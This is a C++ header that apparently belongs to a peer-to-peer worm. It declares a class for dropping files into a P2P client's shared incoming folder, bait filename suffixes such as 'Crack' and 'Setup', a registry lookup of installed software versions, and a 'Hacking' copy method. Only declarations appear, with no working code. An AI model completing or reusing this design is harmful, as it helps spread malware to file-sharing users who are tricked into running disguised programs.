#include <iostream>
#include "FunctionsFiles.h"
#include "WINRegistry.h"
#include "FunctionsStrings.h"

#define SUFIX                  "Manual"
#define SUFIX2                 "Crack"
#define SUFIX3                 "Setup"
#define BUFFER_READ_LINE       500 
#define BUFFER_PORT_LEN        7
#define DISCARD_PATTERN_LEN    10
#define DISCARD_PATTERN1       "KB"
#define DISCARD_PATTERN2       "MSI"
#define SOFTWARE_VERSION_KEY   "DisplayVersion"

#pragma once

using namespace std;

class P2P {
   protected:
      unsigned int listeningPort;
      char * rootFolderFullPath;
      char * incomingFolderFullPath;
      
   public:
      P2P(const char * rootFolderFullPath, const char * incomingFolderPath);
      ~P2P() { delete [] incomingFolderFullPath; delete [] rootFolderFullPath; }
      
      virtual bool scanListeningPort() = 0;
      bool copyFileToIncomingFolder(const char * strFilename);
      bool copyFileToIncomingFolderHacking(const char * strFilename);
      char * getIncomingFolder() { return incomingFolderFullPath; }
      unsigned int getListeningPort() { return listeningPort; }
};
